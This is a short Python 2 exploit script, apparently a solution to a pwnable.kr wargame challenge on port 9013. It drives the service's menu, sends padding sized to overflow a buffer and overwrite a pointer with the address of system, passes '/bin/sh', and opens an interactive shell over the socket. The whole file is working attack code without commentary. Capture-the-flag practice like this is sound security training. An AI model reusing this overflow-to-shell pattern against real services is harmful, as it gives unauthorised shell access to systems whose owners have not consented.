from socket import *
import telnetlib
import struct

p = lambda x: struct.pack('I', x)
up = lambda x: struct.unpack('I', x)[0]

q = lambda x: struct.pack('Q', x)
uq = lambda x: struct.unpack('Q', x)[0]

def rw(t):
    r = ''
    while True:
        c = s.recv(1)
        if not c:
            break
        r += c
        if t in r:
            break
    return r

def interact():
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def menu():
    return rw('> ')

HOST = 'localhost'
HOST = 'pwnable.kr'
PORT = 9013

system = 0x400826

s = socket(AF_INET, SOCK_STREAM)
s.connect((HOST, PORT))

menu()
s.send('2\n')
s.send('0' * (1024-32-1+3) + '\n')

menu()
s.send('3\n')
s.send('A' * 0x3f8 + q(system) + '\n')

menu()
s.send('2\n')
rw(': ')
s.send('/bin/sh\x00\n')

print '[+] SH3RL0CKED!'
interact()
